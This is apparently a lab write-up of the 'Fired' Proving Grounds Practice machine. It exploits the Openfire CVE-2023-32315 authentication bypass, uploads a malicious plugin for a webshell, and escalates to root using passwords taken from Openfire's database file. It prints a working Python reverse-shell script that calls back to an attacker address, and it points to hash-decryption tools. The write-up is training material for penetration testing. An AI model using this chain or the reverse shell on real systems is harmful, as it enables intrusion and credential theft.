---
layout: post
title: "Fired - Proving Grounds Practice"
summary: "OpenFire 4.7.3 → CVE-2023-32315 (Path Traversal to Auth Bypass) → Malicious Openfire Plugin to WebShell → Python Reverse Shell → /usr/share/openfire/embedded-db/openfire.script file includes passwords → Cleartext password → root → Note: openfire.script includes hashed passwords, they can also be decrypted"
---

# Fired - Proving Grounds Practice

## Enumeration
### Nmap 
Initial nmap scan revealed SSH and port 9090 were open.

<img width="1036" height="620" alt="00 - nmap" src="https://github.com/user-attachments/assets/6ddc02f4-cb6b-4312-bb46-1e6163a5675c" />

### Web Enumeration
I checked port 9090 and found out it was `OpenFire 4.7.3` website. 

<img width="1920" height="900" alt="01 - openfire 4 7 3" src="https://github.com/user-attachments/assets/bf44405a-1f79-4734-9d64-0039de7c7647" />

## Exploitation
### CVE-2023-32315
Openfire is an XMPP server licensed under the Open Source Apache License. Openfire's administrative console, a web-based application, was found to be vulnerable to a path traversal attack via the setup environment. This permitted an unauthenticated user to use the unauthenticated Openfire Setup Environment in an already configured Openfire environment to access restricted pages in the Openfire Admin Console reserved for administrative users. This vulnerability affects all versions of Openfire that have been released since April 2015, starting with version 3.10.0. The problem has been patched in Openfire release 4.7.5 and 4.6.8, and further improvements will be included in the yet-to-be released first version on the 4.8 branch (which is expected to be version 4.8.0). Users are advised to upgrade. If an Openfire upgrade isn’t available for a specific release, or isn’t quickly actionable, users may see the linked github advisory (GHSA-gw42-f939-fhvm) for mitigation advice.

For more information: [https://www.vicarius.io/vsociety/posts/cve-2023-32315-path-traversal-in-openfire-leads-to-rce](https://www.vicarius.io/vsociety/posts/cve-2023-32315-path-traversal-in-openfire-leads-to-rce)

So simply, openfire is vulnerable to authentication bypass via path traversal. I found [an exploit script](https://github.com/K3ysTr0K3R/CVE-2023-32315-EXPLOIT) to add a new administrator user. I simply executed it.

<img width="1919" height="936" alt="02 - exploit" src="https://github.com/user-attachments/assets/b8b12792-755c-4fc9-89bb-56f21afa7c44" />

<img width="1138" height="383" alt="03 - hugme" src="https://github.com/user-attachments/assets/352b8cde-16a4-4578-999d-f373d88c4cec" />

As the new admin user was created, I had access to the admin dashboard.

<img width="1919" height="936" alt="04 - dashboard" src="https://github.com/user-attachments/assets/db5b96d7-3e2b-4e3a-b3f5-ca412040669e" />

Later I learned from my research that we could upload malicious java plugin and get webshell. So I found a [malicious plugin in github](https://github.com/miko550/CVE-2023-32315). 

<img width="1919" height="936" alt="05 - plugin" src="https://github.com/user-attachments/assets/abb02e64-0572-467d-b9cd-b154c6feb39f" />

Then uploaded it.

<img width="1919" height="936" alt="06-  uploaded plugin" src="https://github.com/user-attachments/assets/10315893-d2c9-4801-af93-2cdcf76601a4" />

Then from `Server > Server Settings > Management Tools` I accessed the malicious plugin and entered password 123.

<img width="1919" height="936" alt="07 - management" src="https://github.com/user-attachments/assets/dc757468-fb5a-4800-97d2-5a63000fb906" />

<img width="1919" height="936" alt="08 - pass 123" src="https://github.com/user-attachments/assets/1c2c2874-f372-40dd-bdf9-f3601adf35d8" />

And by selecting system command option, I got remote command execution.

<img width="1919" height="936" alt="09 - rce" src="https://github.com/user-attachments/assets/efbd5b28-8667-49b0-8e05-49a10c99f78d" />

Later, to obtain full reverse shell I created a python script and trasfered it to target.
```python
RHOST="192.168.45.166"
RPORT=1234
import sys,socket,os,pty

s=socket.socket()
s.connect((RHOST,RPORT))
[os.dup2(s.fileno(),fd) for fd in (0,1,2)]

pty.spawn("bash")
```

<img width="1916" height="695" alt="12 - test py" src="https://github.com/user-attachments/assets/0992996f-06e6-485f-a922-69dbf8cfe5f7" />

And simply by executing `python3 <script>`, I got the reverse shell.

<img width="1261" height="642" alt="13 - reverse shell" src="https://github.com/user-attachments/assets/8bf4cc5e-fe6d-4f15-bcea-edd9a49d6c52" />

And read the user flag.

<img width="789" height="191" alt="14 - local flag" src="https://github.com/user-attachments/assets/fb055603-ed26-48a1-b2ab-6ce937b2bf92" />

## Privilege Escalation
### openfire.script
Openfire stores passwords under `/usr/share/openfire/embedded-db/openfire.script`, I simply read it and found a cleartext password.

<img width="1556" height="463" alt="15 - openfire at everyone" src="https://github.com/user-attachments/assets/13542d0c-9cfd-4ec8-a140-4860fd31aeef" />

Luckily, it worked for root and I simply got root shell and flag.

<img width="687" height="200" alt="15 - root flag" src="https://github.com/user-attachments/assets/c7550125-f6aa-4c2f-acd9-61d8dfa01c90" />

## Additional Information
`NOTE:` We could also decrypt hashed passwords by simply using openfire-decryptor scripts that can be found online (e.g. [c0rdis/openfire_decrypt](https://github.com/c0rdis/openfire_decrypt)). We only need to read user's password hash and password key from `openfire.scripts` file.

Before trying plaintext passwords, I tried to decrypt admin hash. However, it was not root password.

<img width="1889" height="153" alt="16 - openfire" src="https://github.com/user-attachments/assets/e0751668-a12d-41ae-af15-90b0f8e9702d" />

<img width="947" height="69" alt="17 - password key" src="https://github.com/user-attachments/assets/791500ba-d003-439f-afe7-1e1bd639ed56" />

<img width="1335" height="85" alt="18 - decrypted" src="https://github.com/user-attachments/assets/12b2062a-c3fb-4c00-b0a2-9a5e20af8ce3" />



